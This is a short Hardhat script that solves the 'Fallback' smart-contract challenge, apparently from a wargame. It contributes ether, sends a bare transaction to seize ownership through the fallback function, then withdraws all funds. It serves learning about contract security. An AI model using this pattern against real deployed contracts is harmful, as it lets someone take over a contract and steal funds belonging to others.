const { ethers } = require('hardhat');

const CTRT_ADDR = "0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B"
const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"


async function main() {
  let player = await ethers.getSigner(PLAYER_ADDR)

  const contract = await ethers.getContractAt(
    "Fallback",
    CTRT_ADDR,
    player
  );


  console.log("--[1] contribute");
  await contract.contribute({
    value: ethers.utils.parseEther("0.0001"),
    gasLimit: 50000
  });

  console.log("Current contribution", ((await contract.getContribution()).toString()))
  
  console.log("--[2] send malicious TX");
  const tx = {
    to: CTRT_ADDR,
    value: ethers.utils.parseEther("0.0001"),
  };

  await player.sendTransaction(tx);

  console.log("--[3] withdraw all the money");
  const owner = await contract.owner();

  if (owner == player.address) {
    await contract.withdraw();
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
